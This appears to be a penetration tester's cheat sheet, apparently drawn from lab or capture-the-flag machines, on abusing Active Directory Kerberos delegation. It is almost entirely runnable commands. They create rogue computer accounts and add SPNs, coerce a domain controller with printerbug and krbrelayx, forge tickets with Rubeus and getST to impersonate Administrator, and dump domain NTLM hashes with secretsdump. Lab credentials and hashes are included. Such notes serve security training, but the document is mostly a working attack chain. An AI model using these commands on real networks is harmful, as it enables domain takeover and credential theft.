####  SeEnableDelegationPrivilege


- Chack the MAQ : 
```sh
nxc ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD -M maq
```

- Create a a computer Unconstrained Delegation (Powermad)
	```sh
Import-Module ./Powermad.ps1

New-MachineAccount -MachineAccount pwned -Password $(ConvertTo-SecureString '12345' -AsPlainText -Force)

Set-MachineAccountAttribute -MachineAccount pwned -Attribute useraccountcontrol -Value 528384

Set-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Value HTTP/pwned.delegate.vl -Append

Get-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Verbose
```

-  Create a a computer Unconstrained Delegation (Impacket)

```sh
addcomputer.py -dc-ip $t -computer-pass TestPassword321 -computer-name UwU delegate.vl/N.Thompson:'KALEB_2341'

addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/UwU.delegate.vl' -t 'UwU$' -dc-ip 10.10.85.247 DC1.delegate.vl --additional

addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/UwU.delegate.vl' -t 'UwU$' -dc-ip 10.10.85.247 DC1.delegate.vl

bloodyAD.py -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host 'DC1.delegate.vl' add uac 'UwU$' -f TRUSTED_FOR_DELEGATION
```

#### Unconstrained Delegation
#ADS_UF_TRUSTED_FOR_DELEGATION
- Enumerate Uncontrained Delegation :
```sh
Get-NetComputer -Unconstrained #Powerview

Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

- Add SPN (Impacket) : 
```sh
addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/UwU.delegate.vl' -t 'UwU$' -dc-ip 10.10.85.247 DC1.delegate.vl --additional

addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/UwU.delegate.vl' -t 'UwU$' -dc-ip 10.10.85.247 DC1.delegate.vl
```

- Add SPN (Powermad) : 
```sh
Set-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Value HTTP/pwned.delegate.vl -Append

Get-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Verbose
```

- Grab CCache
```sh
dnstool.py -u 'delegate.vl\UwU$' -p TestPassword321 -r UwU.delegate.vl -d 10.8.3.12 --action add DC1.delegate.vl -dns-ip $t

krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC

printerbug.py delegate.vl/'UwU$'@dc1.delegate.vl UwU.delegate.vl
```

- Dumping hashes
```sh
export KRB5CCNAME=`pwd`/'krbtgt.ccache
secretsdump.py -k DC1.delegate.vl -just-dc-ntlm
```

#### Constrained Delegation

#TRUSTED_TO_AUTH_FOR_DELEGATION

- Enumerate with powerview  : 
```sh
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

- Get a ticket : 
```sh
rubeus.exe asktgt /user:userName /domainDomainName /ntlm:Hash /outfile:FileName.tgt
```

- Impersonate Administrator : 
```sh
.\Rubeus.exe s4u /ticket:TGT_Ticket /msdsspn:"service/HOST" /impersonateuser:Administrator /ptt
```

- Check accounts with "Trusted for Delegation"
```sh
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Property SamAccountName, TrustedForDelegation
```

- With linux :
```sh
getST.py tengu.vl/gMSA01$ -spn 'MSSQLSvc/SQL.tengu.vl:1433' -impersonate 'T1_M.WINTERS' -hashes :d4b65861e85773fba2035b31ebcacb37 -dc-ip DC.tengu.vl
#Look for user in the group 
```


#### RBCD( Resource-based constrained ) 

- With linux 
```sh
# Read the attribute
rbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action 'read' 'domain'/'PowerfulUser':'Password'

# Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -delegate-from 'controlledaccount' -delegate-to 'target$' -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'Password'

getST.py -spn 'cifs/target' -impersonate Administrator -dc-ip 'DomainController' 'domain/controlledaccountwithSPN:SomePassword'
```

- With windows 
```sh
Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"cifs/target" /domain:"domain" /user:"controlledaccountwithSPN" /rc4:$NThash
```